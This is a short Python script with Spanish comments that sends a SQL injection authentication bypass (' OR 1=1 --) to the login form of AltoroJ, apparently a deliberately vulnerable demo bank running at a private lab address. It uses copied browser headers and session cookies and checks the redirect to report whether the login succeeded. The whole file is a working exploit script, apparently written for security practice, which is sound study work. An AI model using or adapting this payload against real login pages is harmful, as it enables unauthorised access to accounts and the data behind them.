import requests



# Definimos la URL del sitio vulnerable

target_url = "http://10.0.2.15:8080/AltoroJ/doLogin"



# Datos del payload para el login

payload = "uid=' OR 1=1 --&passw=algo&btnSubmit=Login"



# Cabeceras para la solicitud

headers = {

    "Host": "10.0.2.15:8080",

    "Proxy-Connection": "keep-alive",

    "Cache-Control": "max-age=0",

    "Origin": "http://10.0.2.15:8080",

    "Content-Type": "application/x-www-form-urlencoded",

    "Upgrade-Insecure-Requests": "1",

    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",

    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",

    "Referer": "http://10.0.2.15:8080/AltoroJ/login.jsp",

    "Accept-Language": "en-US,en;q=0.9",

    "Cookie": "JSESSIONID=2FC1C983A6D3512B2ABF5F5A690D456C; AltoroAccounts=\"ODAwMDAyflNhdmluZ3N+MTAwMDAuNDJ8ODAwMDAzfkNoZWNraW5nfjE1MDAwLjM5fDQ1MzkwODIwMzkzOTYyODh+Q3JlZGl0IENhcmR+MTAwLjQyfA==\""

}



# Realizamos la petición POST al sitio vulnerable

try:

    response = requests.post(target_url, data=payload, headers=headers, allow_redirects=False)



    # Verificamos el resultado de la solicitud

    if response.status_code == 302 and "Location" in response.headers:

        if response.headers["Location"] == "/AltoroJ/bank/main.jsp":

            print("Login exitoso. Hemos accedido al sistema.")

        elif response.headers["Location"] == "login.jsp":

            print("Login fallido. Las credenciales son incorrectas.")

        else:

            print("Redirección desconocida. Es posible que las credenciales sean incorrectas o que el sitio tenga protecciones.")

    else:

        print("No se logró acceder al sistema. Es posible que las credenciales sean incorrectas o que el sitio tenga protecciones.")



except requests.exceptions.RequestException as e:

    print(f"Error al conectarse al sitio: {e}")

